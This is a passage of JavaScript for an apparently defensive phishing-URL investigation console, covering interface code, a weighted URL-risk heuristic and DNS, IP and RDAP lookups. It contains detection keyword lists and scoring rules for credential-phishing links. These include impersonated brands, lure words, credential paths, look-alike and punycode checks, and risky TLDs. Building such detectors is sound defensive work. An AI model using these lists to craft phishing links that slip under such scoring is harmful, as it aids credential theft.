setTimeout(function(){var b=document.getElementById('boot');if(b)b.remove()},4500);window.addEventListener('error',function(e){var t=document.getElementById('toast');if(t){t.textContent='Script error: '+e.message;t.classList.add('show')}});

'use strict';
/* =====================================================================
   CYBERGUARD AI — core: utilities, config, navigation, visual FX
   ===================================================================== */
const $=(s,r=document)=>r.querySelector(s), $$=(s,r=document)=>[...r.querySelectorAll(s)];
const esc=x=>String(x??'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
const reduced=window.matchMedia&&matchMedia('(prefers-reduced-motion: reduce)').matches;
const LS={
  get(k,d){try{const v=localStorage.getItem('cg.'+k);return v===null?d:JSON.parse(v)}catch{return d}},
  set(k,v){try{localStorage.setItem('cg.'+k,JSON.stringify(v))}catch{}},
  del(k){try{localStorage.removeItem('cg.'+k)}catch{}}
};
const CFG_DEF={doh:true,ipintel:true,rdap:true,urlscan:true,backend:true,apiBase:'',gsbKey:''};
let cfg=Object.assign({},CFG_DEF,LS.get('cfg',{}));
const ACT={};               // data-act handlers, filled by later modules
const fmtDate=d=>{try{const x=new Date(d);return isNaN(x)?String(d):x.toLocaleString(undefined,{year:'numeric',month:'short',day:'2-digit',hour:'2-digit',minute:'2-digit'})}catch{return String(d)}};
const fmtDay=d=>{try{const x=new Date(d);return isNaN(x)?String(d):x.toLocaleDateString(undefined,{year:'numeric',month:'short',day:'2-digit'})}catch{return String(d)}};
const kv=(k,v)=>`<div><div class="k">${esc(k)}</div><div class="v">${v==null||v===''?'<span style="color:var(--muted)">Unknown</span>':esc(v)}</div></div>`;
const tag=(t,c='')=>`<span class="tag ${c}">${esc(t)}</span>`;

function toast(msg){const t=$('#toast');t.textContent=msg;t.classList.add('show');clearTimeout(window.__toast);window.__toast=setTimeout(()=>t.classList.remove('show'),3600)}
async function copyText(txt,label='Copied'){
  try{await navigator.clipboard.writeText(txt);toast(label)}
  catch{const ta=document.createElement('textarea');ta.value=txt;ta.style.cssText='position:fixed;opacity:0';document.body.appendChild(ta);ta.select();try{document.execCommand('copy');toast(label)}catch{toast('Copy failed — select and copy manually')}ta.remove()}
}
function download(name,text,type='text/plain'){const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([text],{type}));a.download=name;document.body.appendChild(a);a.click();setTimeout(()=>{URL.revokeObjectURL(a.href);a.remove()},500)}
function apiUrl(p){return String(cfg.apiBase||'').replace(/\/+$/,'')+p}
async function fetchTO(url,opts={},ms=6000){const ac=new AbortController();const t=setTimeout(()=>ac.abort(),ms);try{return await fetch(url,{...opts,signal:ac.signal})}finally{clearTimeout(t)}}

/* ---------- navigation ---------- */
const LABELS={overview:'COMMAND_CENTER',investigate:'INVESTIGATE_URL',recon:'RECON_DNS',threats:'THREAT_INTEL',behaviour:'PAGE_BEHAVIOUR',timeline:'EVIDENCE_TIMELINE',ai:'CYBERGUARD_AI',scamlab:'SCAM_LAB',report:'INVESTIGATION_REPORT',protection:'INCIDENT_RESPONSE',complaint:'COMPLAINT_EVIDENCE',help:'CYBERCRIME_HELP',training:'PHISH_LAB',privacy:'PRIVACY_CENTER',settings:'SETTINGS_SOURCES'};
const PAGE_HOOKS={};
function navigate(p){
  if(!LABELS[p])p='overview';
  document.body.dataset.page=p;
  $$('.page').forEach(el=>el.classList.toggle('active',el.dataset.page===p));
  $$('.nav button').forEach(b=>b.classList.toggle('active',b.dataset.page===p));
  $('#crumb').textContent=LABELS[p];
  $('#sidebar').classList.remove('open');
  const fab=$('.fab-sos');if(fab)fab.style.visibility=(p==='protection')?'hidden':'';
  window.scrollTo({top:0,behavior:'auto'});
  document.title='CYBERGUARD AI — '+LABELS[p].replace(/_/g,' ');
  PAGE_HOOKS[p]&&PAGE_HOOKS[p]();
}
document.addEventListener('click',e=>{
  const nb=e.target.closest('.nav button');if(nb){navigate(nb.dataset.page);return}
  const g=e.target.closest('[data-go]');if(g){navigate(g.dataset.go);return}
  const f=e.target.closest('[data-fill]');if(f){$('#tgt').value=f.dataset.fill;return}
  const a=e.target.closest('[data-act]');if(a&&ACT[a.dataset.act]){ACT[a.dataset.act](a,e)}
});
ACT.menu=()=>$('#sidebar').classList.toggle('open');
document.addEventListener('keydown',e=>{if(e.key==='Escape'){$('#sidebar').classList.remove('open');closeAccount()}});

/* ---------- engine mode / backend detection ---------- */
const backend={present:false};
async function detectBackend(){
  backend.present=false;
  if(cfg.backend&&!(location.protocol==='file:'&&!cfg.apiBase)){
    try{const r=await fetchTO(apiUrl('/api/scan'),{method:'OPTIONS'},3000);backend.present=r.status!==404&&r.status<500}catch{}
  }
  const txt=backend.present?'FULL STACK MODE':'STANDALONE MODE';
  $('#modeText').textContent=txt;$('#sfMode').textContent=backend.present?'FULL':'STANDALONE';
  $('#ov-mode').textContent=backend.present?'FULL STACK':'STANDALONE';
  $('#ov-mode-sub').textContent=backend.present?'Server API detected':'Browser-side lookups';
  return backend.present;
}

/* ---------- visual FX ---------- */
let fxOn=LS.get('fx',!reduced);
function setFx(on){fxOn=on;document.body.classList.toggle('fx-off',!on);$('#fxBtn').textContent='FX '+(on?'ON':'OFF');LS.set('fx',on)}
ACT.fx=()=>setFx(!fxOn);

function startMatrix(){
  const c=$('#fx-matrix'),ctx=c.getContext('2d');
  const glyphs='01アイウエオカキクケコサシスセソタチツテナニヌネ0123456789ABCDEF<>/{}[]$#%=+*'.split('');
  let w=0,h=0,fs=16,cols=0,drops=[],last=0,dpr=1;
  function size(){
    dpr=Math.min(window.devicePixelRatio||1,innerWidth<900?1:1.5);
    w=innerWidth;h=innerHeight;c.width=Math.floor(w*dpr);c.height=Math.floor(h*dpr);
    ctx.setTransform(dpr,0,0,dpr,0,0);ctx.fillStyle='#000402';ctx.fillRect(0,0,w,h);
    cols=Math.ceil(w/fs);drops=Array.from({length:cols},()=>Math.random()*-60);
  }
  size();addEventListener('resize',size);
  function frame(ts){
    requestAnimationFrame(frame);
    if(!fxOn||document.hidden||ts-last<48)return;
    last=ts;
    ctx.fillStyle='rgba(0,4,2,.13)';ctx.fillRect(0,0,w,h);
    ctx.font=fs+'px "JetBrains Mono",monospace';
    for(let i=0;i<cols;i++){
      const y=drops[i]*fs;
      if(y>0){
        const ch=glyphs[(Math.random()*glyphs.length)|0];
        ctx.fillStyle='#d6ffe4';ctx.fillText(ch,i*fs,y);
        ctx.fillStyle='#00ff66';ctx.fillText(glyphs[(Math.random()*glyphs.length)|0],i*fs,y-fs);
      }
      if(y>h&&Math.random()>.975)drops[i]=Math.random()*-20;
      drops[i]+=.55+((i*7)%5)*.12;
    }
  }
  requestAnimationFrame(frame);
}

function startGlobe(){
  const c=$('#globe');if(!c)return;const ctx=c.getContext('2d');
  let w=0,h=0,dpr=1,rot=0,t0=performance.now();
  const rnd=(function(s){return()=>{s=(s*16807)%2147483647;return(s-1)/2147483646}})(20261007);
  const nodes=Array.from({length:70},()=>({lat:(rnd()-.5)*140,lon:rnd()*360-180,ph:rnd()*6.28}));
  const arcs=Array.from({length:7},()=>newArc());
  function newArc(){const a=nodes[(rnd()*nodes.length)|0],b=nodes[(rnd()*nodes.length)|0];return{a,b,t:rnd(),sp:.0025+rnd()*.004}}
  function size(){const r=c.getBoundingClientRect();dpr=Math.min(devicePixelRatio||1,2);w=r.width;h=r.height;c.width=Math.max(1,w*dpr);c.height=Math.max(1,h*dpr);ctx.setTransform(dpr,0,0,dpr,0,0)}
  size();addEventListener('resize',size);
  const tilt=.42,ct=Math.cos(tilt),st=Math.sin(tilt);
  function vec(lat,lon){const la=lat*Math.PI/180,lo=(lon+rot)*Math.PI/180;return[Math.cos(la)*Math.sin(lo),Math.sin(la),Math.cos(la)*Math.cos(lo)]}
  function tp(v){return[v[0],v[1]*ct-v[2]*st,v[1]*st+v[2]*ct]}
  function frame(now){
    requestAnimationFrame(frame);
    if(document.body.dataset.page&&document.body.dataset.page!=='overview')return;
    if(document.hidden)return;
    if(!w||!h){size();return}
    if(fxOn)rot=((now-t0)*.012)%360;
    ctx.clearRect(0,0,w,h);
    const R=Math.min(w,h)*.38,cx=w*.5,cy=h*.5;
    const g=ctx.createRadialGradient(cx,cy,R*.2,cx,cy,R*1.35);g.addColorStop(0,'rgba(0,255,102,.10)');g.addColorStop(.7,'rgba(0,255,102,.03)');g.addColorStop(1,'rgba(0,255,102,0)');
    ctx.fillStyle=g;ctx.fillRect(0,0,w,h);
    ctx.lineWidth=1;
    for(let lat=-60;lat<=60;lat+=20){ctx.beginPath();let pen=false;for(let lon=-180;lon<=180;lon+=6){const p=tp(vec(lat,lon));if(p[2]>0){const x=cx+p[0]*R,y=cy-p[1]*R;pen?ctx.lineTo(x,y):ctx.moveTo(x,y);pen=true}else pen=false}ctx.strokeStyle='rgba(0,255,102,.22)';ctx.stroke()}
    for(let lon=-180;lon<180;lon+=20){ctx.beginPath();let pen=false;for(let lat=-90;lat<=90;lat+=6){const p=tp(vec(lat,lon));if(p[2]>0){const x=cx+p[0]*R,y=cy-p[1]*R;pen?ctx.lineTo(x,y):ctx.moveTo(x,y);pen=true}else pen=false}ctx.strokeStyle='rgba(0,255,102,.2)';ctx.stroke()}
    ctx.beginPath();ctx.arc(cx,cy,R,0,6.2832);ctx.strokeStyle='rgba(0,255,102,.75)';ctx.lineWidth=1.5;ctx.shadowColor='#00ff66';ctx.shadowBlur=14;ctx.stroke();ctx.shadowBlur=0;
    const tt=now/1000;
    for(const n of nodes){const p=tp(vec(n.lat,n.lon));if(p[2]<=0)continue;const pulse=.5+.5*Math.sin(tt*2+n.ph);ctx.fillStyle=`rgba(0,255,102,${.35+.55*pulse})`;ctx.beginPath();ctx.arc(cx+p[0]*R,cy-p[1]*R,1.4+pulse*1.6,0,6.2832);ctx.fill()}
    for(const a of arcs){
      a.t+=fxOn?a.sp:0;if(a.t>1){Object.assign(a,newArc(),{t:0})}
      const A=vec(a.a.lat,a.a.lon),B=vec(a.b.lat,a.b.lon);
      const dot=Math.max(-1,Math.min(1,A[0]*B[0]+A[1]*B[1]+A[2]*B[2])),om=Math.acos(dot);if(om<.2)continue;
      ctx.beginPath();let pen=false,head=null;
      for(let i=0;i<=40;i++){const s=i/40,k1=Math.sin((1-s)*om)/Math.sin(om),k2=Math.sin(s*om)/Math.sin(om);const lift=1+Math.sin(Math.PI*s)*.22;const v=[(A[0]*k1+B[0]*k2)*lift,(A[1]*k1+B[1]*k2)*lift,(A[2]*k1+B[2]*k2)*lift];const p=tp(v);if(p[2]>-.05){const x=cx+p[0]*R,y=cy-p[1]*R;pen?ctx.lineTo(x,y):ctx.moveTo(x,y);pen=true;if(i/40<=a.t)head=[x,y]}else pen=false}
      ctx.strokeStyle='rgba(25,230,255,.35)';ctx.lineWidth=1;ctx.stroke();
      if(head){ctx.fillStyle='#e9fff1';ctx.shadowColor='#19e6ff';ctx.shadowBlur=10;ctx.beginPath();ctx.arc(head[0],head[1],2.2,0,6.2832);ctx.fill();ctx.shadowBlur=0}
    }
  }
  requestAnimationFrame(frame);
}

/* ---------- boot sequence (one orchestrated moment) ---------- */
function boot(){
  const el=$('#boot');if(!el)return;
  if(reduced||sessionStorage.getItem('cg.booted')){el.remove();return}
  const lines=['CYBERGUARD AI // secure investigation console v2.0','> loading multi-signal heuristic engine ......... [ <span class="ok">OK</span> ]','> loading evidence correlation core .............. [ <span class="ok">OK</span> ]','> loading DNS · RDAP · ASN reconnaissance ......... [ <span class="ok">OK</span> ]','> loading victim-protection protocols ............. [ <span class="ok">OK</span> ]','> loading Maharashtra cybercrime directory ........ [ <span class="ok">OK</span> ]','> privacy: location OFF · secrets OFF · tracking OFF','> <span class="ok">SYSTEM ONLINE — stay sharp.</span>'];
  const out=$('#bootText');let i=0,done=false,timer;
  const end=()=>{if(done)return;done=true;clearTimeout(timer);sessionStorage.setItem('cg.booted','1');el.style.transition='opacity .35s';el.style.opacity='0';setTimeout(()=>el.remove(),380)};
  const step=()=>{if(done)return;if(i<lines.length){out.insertAdjacentHTML('beforeend',lines[i++]+'<br>');timer=setTimeout(step,i===lines.length?420:150)}else end()};
  el.addEventListener('click',end);addEventListener('keydown',end,{once:true});step();
}

/* ---------- history (local only) ---------- */
function getHistory(){return LS.get('history',[])}
function pushHistory(rec){const h=getHistory().filter(x=>x.url!==rec.url);h.unshift(rec);LS.set('history',h.slice(0,12));renderHistory()}
function renderHistory(){
  const h=getHistory();
  $('#ov-scans').textContent=h.length;$('#sfScans').textContent=h.length;$('#sfLast').textContent=h[0]?h[0].host.slice(0,18):'—';
  const box=$('#historyList');
  if(!h.length){box.innerHTML='<div class="empty">No investigations yet. Run one above.</div>';return}
  box.innerHTML='<div class="tw"><table class="tbl"><tbody>'+h.slice(0,8).map(x=>`<tr><td><b>${esc(x.host)}</b><div class="sub">${esc(fmtDate(x.ts))}</div></td><td>${tag(x.verdict,x.score>=60?'r':x.score>=30?'a':'')}</td><td>${x.score}/100 · ${x.conf}%</td><td><button class="btn sm" data-rescan="${esc(x.url)}">RE-SCAN</button></td></tr>`).join('')+'</tbody></table></div>';
}
document.addEventListener('click',e=>{const b=e.target.closest('[data-rescan]');if(b){$('#tgt').value=b.dataset.rescan;ACT.scan()}});

/* ---------- account modal (needs optional backend) ---------- */
function closeAccount(){$('#accountModal').classList.remove('show')}
ACT.account=()=>{$('#accountModal').classList.add('show');authCall({action:'me'},true)};
ACT['account-close']=closeAccount;
async function authCall(body,quiet){
  const s=$('#authStatus');
  if(!backend.present){s.textContent='Standalone mode: no account service is connected. All features work without signing in.';return}
  try{const r=await fetchTO(apiUrl('/api/auth'),{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(body)},7000);const d=await r.json().catch(()=>({}));
    s.textContent=r.ok?(d.user?('Signed in as '+d.user.username):(body.action==='register'?'Account created.':'Done.')):(quiet?('Not signed in. '+(d.error||'')):(d.error||'Request failed'))}
  catch{s.textContent='Authentication service unavailable.'}
}
ACT['auth-login']=()=>authCall({action:'login',identifier:$('#authId').value,password:$('#authPw').value});
ACT['auth-logout']=()=>authCall({action:'logout'});
ACT['auth-register']=()=>authCall({action:'register',firstName:$('#authFirst').value,lastName:$('#authLast').value,email:$('#authEmail').value,username:$('#authUser').value,password:$('#authNew').value});

/* =====================================================================
   URL SECURITY ENGINE — multi-signal heuristics (no single signal = phishing)
   ===================================================================== */
const BRANDS=['paypal','google','microsoft','apple','amazon','netflix','facebook','instagram','whatsapp','bankofamerica','wellsfargo','chase','citibank','dropbox','docusign','outlook','office365','adobe','linkedin','coinbase','binance','ebay','twitter','sbi','hdfcbank','hdfc','icicibank','icici','axisbank','kotak','yesbank','pnb','paytm','phonepe','gpay','irctc','flipkart','jio','airtel','aadhaar','uidai','incometax','epfo','bhim'];
const URGENCY=['verify','confirm','update','suspend','locked','urgent','secure-','security-','validate','restore','unlock','reactivate','alert','kyc','refund','reward','claim','prize','lottery','cashback','challan','fastag','expire'];
const CRED=['login','signin','sign-in','account','password','credential','wp-admin','webscr','banking','netbanking','verify','otp'];
const BADTLD=['.zip','.review','.country','.kim','.cricket','.science','.work','.party','.gq','.tk','.ml','.cf','.top','.xyz','.click','.link','.download','.win','.mov'];
const SHORTENERS=['bit.ly','tinyurl.com','t.co','goo.gl','is.gd','cutt.ly','rb.gy','shorturl.at','ow.ly','tiny.cc','rebrand.ly','t.ly','bl.ink'];
const FREEHOST=['vercel.app','netlify.app','pages.dev','web.app','github.io','blogspot.com','weebly.com','wixsite.com','000webhostapp.com','firebaseapp.com','herokuapp.com','workers.dev','glitch.me','repl.co'];
const TRUSTED=['google.com','googleapis.com','googleusercontent.com','gstatic.com','microsoft.com','microsoftonline.com','live.com','office.com','apple.com','icloud.com','amazon.com','amazon.in','amazonaws.com','paypal.com','github.com','wikipedia.org','anthropic.com','facebook.com','instagram.com','whatsapp.com','netflix.com','linkedin.com','sbi.co.in','onlinesbi.sbi','hdfcbank.com','icicibank.com','axisbank.com','kotak.com','paytm.com','phonepe.com','flipkart.com','irctc.co.in','incometax.gov.in','uidai.gov.in','jio.com','airtel.in','cybercrime.gov.in','mahapolice.gov.in','mumbaipolice.gov.in'];
/* Lightweight Public-Suffix subset: multi-part public suffixes + popular shared-hosting suffixes. */
const MPS=new Set(['co.uk','org.uk','gov.uk','ac.uk','co.in','net.in','org.in','gov.in','nic.in','ac.in','edu.in','res.in','firm.in','gen.in','ind.in','com.au','net.au','org.au','co.nz','co.jp','ne.jp','or.jp','co.za','com.br','com.cn','com.hk','com.sg','com.my','com.mx','com.ar','com.tr','com.pk','com.bd','com.ng','co.id','co.kr','com.ph','com.vn','com.tw','co.il',...FREEHOST]);
const GLYPH={'0':'o','1':'l','3':'e','4':'a','5':'s','7':'t','8':'b'};

function lev(a,b){const m=Array.from({length:b.length+1},(_,i)=>[i]);for(let j=0;j<=a.length;j++)m[0][j]=j;for(let i=1;i<=b.length;i++)for(let j=1;j<=a.length;j++)m[i][j]=b[i-1]===a[j-1]?m[i-1][j-1]:1+Math.min(m[i-1][j-1],m[i][j-1],m[i-1][j]);return m[b.length][a.length]}
const isIPv4=h=>/^\d{1,3}(\.\d{1,3}){3}$/.test(h);
const isIPLit=h=>isIPv4(h)||/^\[.*\]$/.test(h)||/^[0-9a-f:]+:[0-9a-f:]*$/i.test(h);
function registrable(host){
  if(isIPLit(host))return host;
  const l=host.split('.');if(l.length<=2)return host;
  return MPS.has(l.slice(-2).join('.'))?l.slice(-3).join('.'):l.slice(-2).join('.');
}
function isReservedIP(ip){
  ip=String(ip).replace(/[\[\]]/g,'').toLowerCase();
  if(isIPv4(ip)){const [a,b,c]=ip.split('.').map(Number);
    return a===0||a===10||a===127||a>=224||(a===100&&b>=64&&b<=127)||(a===169&&b===254)||(a===172&&b>=16&&b<=31)||(a===192&&b===168)||(a===192&&b===0&&(c===0||c===2))||(a===198&&(b===18||b===19))||(a===198&&b===51&&c===100)||(a===203&&b===0&&c===113)}
  return ip==='::1'||ip==='::'||/^f[cd]/.test(ip)||/^fe[89ab]/.test(ip)||ip.startsWith('2001:db8');
}
function isTrusted(reg,host){return TRUSTED.includes(reg)||/\.(gov|nic)\.in$/.test(host)}
function brandInHost(host){
  const toks=host.split(/[.\-_]/);
  for(const b of BRANDS){if(toks.includes(b)||(b.length>=6&&toks.some(t=>t.includes(b))))return b}
  return null;
}

function heuristic(raw){
  let input=String(raw||'').trim();
  if(!input||/\s/.test(input))return null;
  if(!/^[a-z][a-z0-9+.-]*:\/\//i.test(input))input='https://'+input;
  let u;try{u=new URL(input)}catch{return null}
  if(!['http:','https:'].includes(u.protocol))return null;
  const host=u.hostname.toLowerCase().replace(/\.$/,'');if(!host)return null;
  const ipLit=isIPLit(host),reg=registrable(host),labels=host.split('.');
  const sld=ipLit?host:reg.split('.')[0];
  const path=(u.pathname+u.search).toLowerCase();
  const flags=[],passes=[];let score=0;
  const add=(title,desc,pts,sev='warn')=>{flags.push({title,desc,pts,sev});score+=pts};
  const trusted=!ipLit&&isTrusted(reg,host);

  if(ipLit)add('Raw IP address as host','The target uses an IP literal rather than a normal domain name.',28,'flag');else passes.push('Proper hostname');
  if(u.protocol==='http:')add('No HTTPS','The connection is not encrypted in transit.',10);else passes.push('HTTPS enabled (encryption only — not proof of legitimacy)');
  if(u.username||u.password)add('Credentials / “@” in URL','Text before “@” can disguise the real destination.',16,'flag');
  const brand=!ipLit&&!trusted?brandInHost(host):null;
  if(brand)add('Brand keyword in unaffiliated domain',`“${brand}” appears in a hostname that does not belong to that brand.`,28,'flag');
  let look=null;
  if(!ipLit&&!trusted){
    const parts=[...new Set([sld,...sld.split('-').filter(x=>x.length>=5)])];
    outer:for(const t of TRUSTED){const base=t.split('.')[0];if(base.length<5)continue;
      for(const part of parts){if(part===base)continue;
        const norm=part.replace(/[0134578]/g,c=>GLYPH[c]);
        if(norm===base||(Math.abs(part.length-base.length)<=2&&lev(part,base)<=1)){look=t;break outer}}}
  }
  if(look)add('Possible look-alike domain',`Domain is unusually close to ${look}.`,24,'flag');
  const hy=(host.match(/-/g)||[]).length;
  if(hy>=2)add('Multiple domain hyphens','Hyphen chaining is common in deceptive domains.',8);else if(hy===1)add('Hyphenated domain','Minor contextual signal.',3);
  if(host.length>34)add('Long hostname',`Hostname length is ${host.length} characters.`,7);
  if(u.href.length>75)add('Long URL',`Full URL is ${u.href.length} characters.`,5);
  const tld=BADTLD.find(t=>host.endsWith(t));
  if(tld)add('Higher-abuse TLD observed',`${tld} is a weak contextual signal only — many legitimate sites use it.`,6);
  const urg=URGENCY.find(k=>host.includes(k)||path.includes(k));
  if(urg)add('Urgency / lure language',`The token “${urg.replace('-','')}” appears in the target.`,9);
  const cred=CRED.find(k=>path.includes(k));
  if(cred)add('Credential-related path',`Path contains “${cred}”, raising the sensitivity of any other warning sign.`,8);
  if(host.includes('xn--'))add('Punycode hostname','Internationalised encoding can hide look-alike characters.',22,'flag');else passes.push('No punycode');
  const sub=ipLit?0:labels.length-reg.split('.').length;
  if(sub>=3)add('Deep subdomain nesting',`${sub} subdomain labels in front of ${reg}.`,7);
  if(SHORTENERS.includes(reg))add('URL shortener hides destination','The real destination is not visible from this link.',12);
  if(u.port&&!['80','443'].includes(u.port))add('Non-standard port',`Port ${u.port} is unusual for a public website.`,6);
  if(((host+path).match(/%[0-9a-f]{2}/g)||[]).length>=3)add('Heavy percent-encoding','Encoded characters can hide the real path or host.',5);
  if(/\.(apk|exe|msi|scr|bat|jar|iso|dmg|zip|rar)(\?|$)/.test(u.pathname.toLowerCase()))add('Downloadable file in path','The link points at a downloadable/executable file type.',14,'flag');
  if(/[?&](url|redirect|redir|next|return|returnurl|dest|goto)=https?/i.test(u.search))add('Redirect parameter in URL','Open-redirect style parameters can bounce visitors elsewhere.',8);
  if(FREEHOST.some(f=>host===f||host.endsWith('.'+f)))add('Free hosting subdomain','Weak signal: legitimate and malicious sites both use free hosts.',3);
  if(!ipLit&&(sld.match(/\d/g)||[]).length>=4&&/[a-z]/.test(sld))add('Many digits in domain name','Digit-heavy names are common in throwaway domains.',4);
  if(trusted)passes.push('Known reference domain');
  if((brand||look)&&(cred||urg))add('Correlated signals','Brand impersonation together with credential or urgency cues is a stronger pattern than any one alone.',10,'flag');

  if(trusted)score=Math.max(0,score-15);
  if(flags.length<=1)score=Math.min(score,29);          // one signal can never be “phishing” on its own
  return{url:u.href,host,reg,sld,protocol:u.protocol,isIP:ipLit,path:u.pathname+u.search,flags,passes,score:Math.min(100,score),trusted};
}

/* =====================================================================
   LOOKUP LAYER — public, CORS-friendly sources; every call has timeout,
   retry/fallback, caching and graceful degradation
   ===================================================================== */
const _cache=new Map();
async function cached(key,fn,ttl=300000){
  const c=_cache.get(key);if(c&&Date.now()-c.t<ttl)return c.v;
  const v=await fn();_cache.set(key,{v,t:Date.now()});return v;
}
async function fj(url,{timeout=6000,retries=0,opts={}}={}){
  let last;
  for(let i=0;i<=retries;i++){
    try{const r=await fetchTO(url,opts,timeout);if(!r.ok)throw new Error('HTTP '+r.status);return await r.json()}
    catch(e){last=e;if(i<retries){con.retry++;con.log('retry '+(i+1)+' → '+url.split('?')[0].slice(0,60),'w');await sleep(350)}}
  }
  throw last;
}
const T={A:1,CNAME:5,NS:2,PTR:12,MX:15,TXT:16,AAAA:28};
async function doh(name,type){
  return cached('doh:'+type+':'+name,async()=>{
    const enc=encodeURIComponent(name);let last;
    const prov=[['dns.google',`https://dns.google/resolve?name=${enc}&type=${type}`,{}],['cloudflare-dns.com',`https://cloudflare-dns.com/dns-query?name=${enc}&type=${type}`,{headers:{accept:'application/dns-json'}}]];
    for(const [i,[p,u,o]] of prov.entries()){
      try{const d=await fj(u,{timeout:5000,opts:o});return{status:d.Status,provider:p,answers:(d.Answer||[]).map(a=>({type:a.type,data:String(a.data||''),ttl:a.TTL}))}}
      catch(e){last=e;if(i===0){con.retry++;con.log('DoH fallback → cloudflare-dns.com','w')}}
    }
    throw last;
  });
}
const clean=s=>s.replace(/\.$/,'');
const txtClean=s=>s.replace(/^"|"$/g,'').replace(/"\s*"/g,'');
const DKIM_SEL=['google','selector1','selector2','default','k1'];

async function dnsRecon(h,sv){
  if(sv&&sv.dns&&(sv.dns.addresses||sv.dns.A)){
    const d=sv.dns;return{ok:true,provider:'server /api/scan',A:d.addresses||d.A||[],AAAA:d.AAAA||[],MX:d.MX||[],NS:d.NS||[],TXT:d.TXT||[],CNAME:[],SPF:(d.TXT||[]).find(x=>/^v=spf1/i.test(x))||null,DMARC:null,DKIM:[],nx:false};
  }
  if(h.isIP)return{ok:true,skipped:'IP literal — no DNS lookup needed',A:isIPv4(h.host)?[h.host]:[],AAAA:isIPv4(h.host)?[]:[h.host.replace(/[\[\]]/g,'')],MX:[],NS:[],TXT:[],CNAME:[],SPF:null,DMARC:null,DKIM:[],nx:false,provider:'n/a'};
  if(!cfg.doh)return{ok:false,disabled:true};
  const dom=h.reg,q=(n,t)=>doh(n,t).catch(e=>({err:e}));
  const [a,aaaa,mx,ns,txt,dm,...dk]=await Promise.all([q(h.host,'A'),q(h.host,'AAAA'),q(dom,'MX'),q(dom,'NS'),q(dom,'TXT'),q('_dmarc.'+dom,'TXT'),...DKIM_SEL.map(s=>q(s+'._domainkey.'+dom,'TXT'))]);
  if(a.err&&aaaa.err)return{ok:false,error:'DNS-over-HTTPS unreachable ('+(a.err.message||'network error')+')'};
  const pick=(r,t)=>r.err?[]:r.answers.filter(x=>x.type===t).map(x=>x.data);
  const txts=pick(txt,T.TXT).map(txtClean);
  const out={ok:true,provider:(a.provider||aaaa.provider||'dns.google'),
    A:pick(a,T.A),AAAA:pick(aaaa,T.AAAA),CNAME:pick(a,T.CNAME).map(clean),
    MX:pick(mx,T.MX).map(clean),NS:pick(ns,T.NS).map(clean),TXT:txts,
    SPF:txts.find(x=>/^v=spf1/i.test(x))||null,
    DMARC:pick(dm,T.TXT).map(txtClean).find(x=>/^v=DMARC1/i.test(x))||null,
    DKIM:dk.map((r,i)=>({sel:DKIM_SEL[i],rec:pick(r,T.TXT).map(txtClean).find(x=>/v=DKIM1|p=/.test(x))})).filter(x=>x.rec),
    nx:a.status===3&&!a.err,mailSeen:{mx:!mx.err,txt:!txt.err,dmarc:!dm.err}};
  return out;
}

async function infraRecon(h,dns,sv){
  if(sv&&sv.infrastructure){const i=sv.infrastructure;return{ok:true,source:'server /api/scan',ip:i.ip||dns?.A?.[0],asn:i.asn,org:i.organization||i.org,isp:i.isp,country:i.country,region:i.region,city:i.city,tz:i.timezone,lat:i.latitude,lon:i.longitude,rdns:i.reverseDns||null}}
  const ip=h.isIP?h.host.replace(/[\[\]]/g,''):(dns?.A?.[0]||dns?.AAAA?.[0]);
  if(!ip)return{ok:false,error:dns?.nx?'Domain does not resolve — no IP to analyse':'No IP address available'};
  if(isReservedIP(ip))return{ok:false,ip,skipped:'Private / reserved address — never sent to external services'};
  if(!cfg.ipintel)return{ok:false,ip,disabled:true};
  let info=null,src='';
  try{const d=await cached('ip:'+ip,()=>fj('https://ipwho.is/'+encodeURIComponent(ip),{timeout:6000}));
    if(d&&d.success!==false){src='ipwho.is';info={ip,asn:d.connection?.asn?('AS'+d.connection.asn):null,org:d.connection?.org,isp:d.connection?.isp,country:d.country,region:d.region,city:d.city,tz:d.timezone?.id,lat:d.latitude,lon:d.longitude}}}
  catch{con.retry++;con.log('ipwho.is unavailable → trying ipapi.co','w')}
  if(!info){try{const d=await cached('ip2:'+ip,()=>fj('https://ipapi.co/'+encodeURIComponent(ip)+'/json/',{timeout:6000}));
    if(d&&!d.error){src='ipapi.co';info={ip,asn:d.asn,org:d.org,isp:d.org,country:d.country_name,region:d.region,city:d.city,tz:d.timezone,lat:d.latitude,lon:d.longitude}}}catch{}}
  if(!info)return{ok:false,ip,error:'IP intelligence providers unreachable'};
  info.ok=true;info.source=src;
  if(isIPv4(ip)&&cfg.doh){try{const r=await doh(ip.split('.').reverse().join('.')+'.in-addr.arpa','PTR');info.rdns=r.answers.filter(x=>x.type===T.PTR).map(x=>clean(x.data)).join(', ')||null}catch{}}
  return info;
}

function vcardGet(ent,key){const v=(ent?.vcardArray?.[1]||[]).find(x=>x[0]===key);return v?v[3]:null}
async function rdapRecon(h,sv){
  if(sv&&sv.rdap)return parseRdap(sv.rdap,'server /api/scan');
  if(h.isIP)return{ok:false,skipped:'IP literal — no domain registration'};
  if(!cfg.rdap)return{ok:false,disabled:true};
  const dom=h.reg,tld=dom.split('.').pop();
  const urls=[`https://rdap.org/domain/${encodeURIComponent(dom)}`];
  try{const b=await cached('rdapboot',()=>fj('https://data.iana.org/rdap/dns.json',{timeout:5000}),3600000);
    const svc=(b.services||[]).find(s=>s[0].includes(tld));const base=svc&&(svc[1].find(u=>u.startsWith('https'))||svc[1][0]);
    if(base)urls.push(base.replace(/\/?$/,'/')+'domain/'+encodeURIComponent(dom))}catch{}
  for(const u of urls){
    try{const d=await cached('rdap:'+u,()=>fj(u,{timeout:7000,opts:{headers:{accept:'application/rdap+json, application/json'}}}));return parseRdap(d,new URL(u).host)}
    catch(e){if(/HTTP 404/.test(e.message||'')){return{ok:false,notFound:true,error:'No registration record for '+dom}}con.log('RDAP '+new URL(u).host+' unreachable','w')}
  }
  return{ok:false,error:'RDAP unreachable from the browser (provider or CORS limit)'};
}
function parseRdap(d,source){
  const ev=d.events||[],get=n=>(ev.find(e=>String(e.eventAction).toLowerCase().includes(n))||{}).eventDate||null;
  const reg=(d.entities||[]).find(e=>(e.roles||[]).includes('registrar'));
  const rnt=(d.entities||[]).find(e=>(e.roles||[]).includes('registrant'));
  const rurl=(reg?.links||[]).find(l=>l.rel==='about'||l.rel==='related'||l.rel==='self')?.href||vcardGet(reg,'url')||null;
